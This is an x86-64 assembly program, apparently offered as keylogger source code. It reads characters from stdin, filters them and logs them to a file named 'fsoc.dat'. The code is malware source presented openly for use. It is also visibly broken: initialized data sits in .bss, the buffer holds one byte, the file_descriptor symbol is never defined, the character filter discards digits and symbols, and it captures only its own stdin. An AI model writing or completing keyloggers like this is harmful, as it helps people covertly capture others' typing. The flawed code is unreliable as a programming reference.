section .bss
    logfile db 'fsoc.dat', 0   ; Null-terminated string for the log file name
    buffer db 64               ; Buffer to store keystrokes
    buffer_len equ $ - buffer  ; Length of the buffer

section .text
    global _start

_start:
    ; Open the log file
    mov rdi, logfile
    mov rax, 2          ; Syscall number for open
    mov rsi, 0x1        ; Flags (O_WRONLY)
    syscall

    ; Check for error in file open (rax will contain the file descriptor)
    test rax, rax
    js error_exit

keylogger_loop:
    ; Read a single character from stdin (keyboard)
    mov rax, 0          ; Syscall number for sys_read
    mov rdi, 0          ; File descriptor 0 (stdin)
    mov rsi, buffer     ; Buffer to store the character
    mov rdx, 1          ; Length to read
    syscall

    ; Check for errors in reading
    test rax, rax
    js error_exit

    ; Check if the character is a valid printable character (letters, numbers, symbols)
    cmp byte [buffer], 'A'   ; Check for capital letters
    jl discard_character
    cmp byte [buffer], 'Z'
    jle log_character

    cmp byte [buffer], 'a'   ; Check for small letters
    jl discard_character
    cmp byte [buffer], 'z'
    jle log_character

    cmp byte [buffer], '0'   ; Check for numbers
    jl discard_character
    cmp byte [buffer], '9'
    jle log_character

    cmp byte [buffer], ' '   ; Check for common symbols
    je log_character
    cmp byte [buffer], '!'
    je log_character
    ; Add more symbols as needed

discard_character:
    ; Character is not a printable letter, number, or symbol - discard it
    jmp keylogger_loop

log_character:
    ; Write the character to the log file
    mov rax, 1          ; Syscall number for sys_write
    mov rdi, [file_descriptor]  ; Use the file descriptor obtained during open
    mov rsi, buffer     ; Buffer to write
    mov rdx, 1          ; Length to write
    syscall

    ; Check for errors in writing
    test rax, rax
    js error_exit

    ; Loop to continue capturing keypresses
    jmp keylogger_loop

error_exit:
    ; Handle errors and clean up
    ; Close the file if it was successfully opened
    mov rax, 3          ; Syscall number for sys_close
    mov rdi, [file_descriptor]
    syscall

    ; Exit the program
    mov rax, 60         ; Syscall number for sys_exit
    xor rdi, rdi        ; Return code 0
    syscall
